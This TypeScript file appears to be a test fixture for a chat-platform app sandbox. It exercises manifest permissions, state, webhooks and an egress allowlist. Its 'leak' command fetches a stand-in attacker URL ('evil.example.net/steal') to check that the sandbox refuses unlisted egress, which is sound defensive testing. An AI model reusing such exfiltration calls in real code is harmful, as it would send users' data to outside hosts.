import { app, RefusedError } from "@pollis/app";

export default app({
  manifest: {
    read: { channels: ["#support"], history: 7, events: ["created", "edited"] },
    actions: ["post", "reply", "react"],
    state: { quota: 1024 },
    egress: ["api.example.com"],
  },

  async onCommand(cmd, ctx) {
    switch (cmd.name) {
      case "count": {
        const n = ((await ctx.state.getJSON<number>("count")) ?? 0) + 1;
        await ctx.state.setJSON("count", n);
        await ctx.reply(cmd.message, `count is ${n}`);
        return;
      }
      case "ticket": {
        const res = await ctx.fetch("https://api.example.com/tickets", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ title: cmd.args }),
        });
        const body = await res.json<{ id: string }>();
        await ctx.reply(cmd.message, `Filed ${body.id} (${res.status}, ${res.headers.get("x-kind")})`);
        return;
      }
      case "leak": {
        try {
          await ctx.fetch("https://evil.example.net/steal");
        } catch (e) {
          await ctx.reply(cmd.message, e instanceof RefusedError ? `refused: ${e.message}` : `other: ${String(e)}`);
        }
        return;
      }
      case "edit":
        // Not in `actions`: the refusal rejects, the handler throws, nothing is sent.
        await ctx.reply(cmd.message, "this reply is discarded");
        await ctx.editOwn(cmd.message, "nope");
        return;
      case "history": {
        const found = await ctx.messages({ limit: 10 });
        await ctx.reply(cmd.message, found.map((m) => m.text).join(" | "));
        return;
      }
      case "random": {
        const bytes = new Uint8Array(8);
        crypto.getRandomValues(bytes);
        ctx.log.info(`random ${Math.random()} ${Array.from(bytes).join(",")}`);
        console.log("hello from console.log");
        await ctx.react(cmd.message, "🎲");
        return;
      }
      case "throw":
        throw new Error("something broke");
      default:
        await ctx.post(cmd.message.channel, `unknown command ${cmd.name}`);
    }
  },

  async onMessage(message, ctx) {
    if (message.text.includes("help")) {
      await ctx.reply(message, "Try /ticket");
    }
  },

  async onSchedule(schedule, ctx) {
    ctx.log.info(`schedule ${schedule.name} at ${new Date(schedule.slot).toISOString()} now ${ctx.now()}`);
  },

  async onWebhook(webhook, ctx) {
    const event = webhook.json<{ text: string; channel: string }>();
    await ctx.post(event.channel, event.text);
  },
});
